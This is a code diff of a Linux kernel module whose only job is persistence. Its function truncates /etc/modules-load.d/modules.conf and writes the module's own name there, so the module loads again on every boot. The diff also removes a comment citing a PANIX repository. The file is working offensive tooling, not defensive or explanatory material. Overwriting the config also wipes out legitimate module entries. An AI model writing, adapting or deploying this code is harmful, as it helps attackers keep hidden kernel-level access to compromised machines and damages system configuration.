@@ -1,11 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0-only
-/*
- * https://github.com/Aegrah/PANIX
- */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
-#define PATH "/etc/modules-load.d/modules.conf"
-#define NAME "persistence\n"
 
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -16,49 +11,50 @@
 #define dbg_print(fmt, ...) /* No-op */
 #endif
 
-static int openrc(void)
+static int persistence(void)
 {
-    struct file *file;
-    char *data = NAME;
-    loff_t pos = 0; // File offset
-    ssize_t written;
+	struct file *file;
+	char *data = kasprintf(GFP_KERNEL, "%s\n", THIS_MODULE->name);
+	char *path = "/etc/modules-load.d/modules.conf";
+	loff_t pos = 0; // File offset
+	ssize_t written;
 
-    // Create or Open the file
-    dbg_print("Open file");
-    file = filp_open(PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (IS_ERR(file))
-    {
-        dbg_print("Failed to open file");
-        return -1;
-    }
+	// Create or Open the file
+	dbg_print("Open file");
+	file = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if (IS_ERR(file)) {
+		dbg_print("Failed to open file");
+		kfree(data);
+		return -1;
+	}
 
-    // Write data
-    dbg_print("Write file");
-    written = kernel_write(file, data, strlen(data), &pos);
-    if (written < 0)
-    {
-        dbg_print("Failed to write file");
-        filp_close(file, NULL);
-        return -1;
-    }
+	// Write data
+	dbg_print("Write file");
+	written = kernel_write(file, data, strlen(data), &pos);
+	if (written < 0) {
+		dbg_print("Failed to write file");
+		filp_close(file, NULL);
+		kfree(data);
+		return -1;
+	}
 
-    filp_close(file, NULL);
-    return 0;
+	filp_close(file, NULL);
+	kfree(data);
+	return 0;
 }
 
 static int __init persistence_init(void)
 {
-    int ret;
+	int ret;
 
 	dbg_print("persistence loaded\n");
-    ret = openrc();
+	ret = persistence();
 
-    if (ret == 0)
-        dbg_print("openrc persistence loaded");
-    else
-    {
-        dbg_print("openrc persistence failed");
-    }
+	if (ret == 0)
+		dbg_print("openrc persistence loaded");
+	else {
+		dbg_print("openrc persistence failed");
+	}
 
 	return 0;
 }
